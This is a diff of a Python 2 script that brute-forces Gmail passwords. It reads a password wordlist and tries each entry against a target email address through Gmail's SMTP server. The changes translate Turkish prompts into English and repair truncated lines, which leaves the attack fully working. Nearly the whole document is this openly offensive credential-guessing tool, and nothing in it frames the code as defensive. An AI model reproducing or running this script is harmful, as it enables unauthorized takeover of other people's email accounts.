@@ -3,15 +3,15 @@
 
 import smtplib
 from os import system
-                                                                     >
+
 def main():
-   print '===================NYKS-WT======================'
+   print '================================================='
 main()
-print '[1] Gmail'
+print '[1] hcked @gmail'
 print '[2] exit'
 option = input('==>')
 if option == 1:
-   file_path = raw_input('Wordlist Yolu:')
+   file_path = raw_input('path of passwords file :')
 else:
    system('clear')
    exit()
@@ -19,7 +19,7 @@ pass_file = open(file_path,'r')
 pass_list = pass_file.readlines()
 def login():
     i = 0
-    user_name = raw_input('Hacklenecek E-Mail Adresi :')
+    user_name = raw_input('target email :')
     server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
     server.ehlo()
     for password in pass_list:
@@ -30,15 +30,15 @@ def login():
          system('clear')
          main()
          print '\n'
-         print '[+] This Account Has Been Hacked Password :' + passwo>
+         print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
          break
       except smtplib.SMTPAuthenticationError as e:
          error = str(e)
          if error[14] == '<':
             system('clear')
             main()
-            print '[+] this account has been hacked, password :' + pa>
-                                                                     >
+            print '[+] this account has been hacked, password :' + password + '     ^_^'
+
             break
          else:
             print '[!] password not found => ' + password
